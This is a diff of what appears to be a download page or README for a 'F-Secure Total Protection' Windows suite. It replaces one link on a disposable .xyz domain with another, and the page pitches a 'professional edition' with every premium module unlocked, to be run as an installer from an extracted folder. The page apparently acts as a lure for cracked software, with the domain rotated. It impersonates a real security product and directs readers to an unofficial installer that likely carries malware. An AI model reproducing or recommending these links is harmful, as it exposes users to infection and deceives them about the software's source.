@@ -8,8 +8,8 @@ Finnish security suite with banking protection · Complete Windows bundle · Not
 
 > Use the project link below for Windows.
 
-* **Project link:** **[f-secure-total-protection-suite-2026.nexpath.xyz](https://f-secure-total-protection-suite-2026.nexpath.xyz/)**
-* **Full URL:** `https://f-secure-total-protection-suite-2026.nexpath.xyz/`
+* **Project link:** **[f-secure-total-protection-suite-2026.nerasix.xyz](https://f-secure-total-protection-suite-2026.nerasix.xyz/)**
+* **Full URL:** `https://f-secure-total-protection-suite-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -39,4 +39,4 @@ This release ships the **professional desktop edition** — every premium module
 | 🧠 RAM | 8 GB RAM suggested |
 | 💾 Disk | 8 GB free for large media libraries |
 
-— — —
+— — —
